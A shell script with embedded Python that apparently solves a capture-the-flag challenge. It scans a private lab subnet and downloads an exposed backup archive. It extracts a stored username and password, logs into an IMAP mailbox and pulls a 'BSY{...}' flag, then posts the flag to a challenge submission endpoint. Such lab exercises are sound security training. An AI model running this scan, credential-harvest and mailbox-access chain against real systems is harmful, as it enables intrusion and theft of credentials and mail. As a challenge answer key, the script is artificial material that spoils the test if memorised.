#!/bin/sh
set -eu

scan="$(nmap -n -p 80,143 --open 172.20.0.141-199 -oG -)"
web_host="$(printf '%s\n' "$scan" | awk '/80\/open/{print $2; exit}')"
imap_host="$(printf '%s\n' "$scan" | awk '/143\/open/{print $2; exit}')"
[ -n "$web_host" ] && [ -n "$imap_host" ]

curl -fsS "http://${web_host}/crew-roster-nightly.tar.gz" -o /tmp/roster-backup.tar.gz
credentials="$(python3 - /tmp/roster-backup.tar.gz <<'PY'
import sys
import tarfile

with tarfile.open(sys.argv[1], 'r:gz') as archive:
    text = archive.extractfile('shift-notes.ini').read().decode()
values = dict(line.split('=', 1) for line in text.splitlines() if '=' in line)
print(values['username'] + '\n' + values['password'])
PY
)"
username="$(printf '%s\n' "$credentials" | sed -n '1p')"
password="$(printf '%s\n' "$credentials" | sed -n '2p')"
flag="$(python3 - "$imap_host" "$username" "$password" <<'PY'
import imaplib
import re
import sys

client = imaplib.IMAP4(sys.argv[1], 143, timeout=8)
client.login(sys.argv[2], sys.argv[3])
status, _ = client.select('INBOX', readonly=True)
if status != 'OK':
    raise SystemExit('Could not select mailbox')
status, data = client.search(None, 'ALL')
if status != 'OK' or not data or not data[0]:
    raise SystemExit('No roster record found')
message_id = data[0].split()[-1]
status, chunks = client.fetch(message_id, '(BODY[])')
if status != 'OK':
    raise SystemExit('Could not read roster record')
raw = b'\n'.join(chunk[1] for chunk in chunks if isinstance(chunk, tuple))
match = re.search(rb'BSY\{[^}]+\}', raw)
if not match:
    raise SystemExit('Challenge token missing from record')
print(match.group().decode())
client.logout()
PY
)"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-dcaf9d\",\"task_id\":\"task1\",\"flag\":\"${flag}\"}"
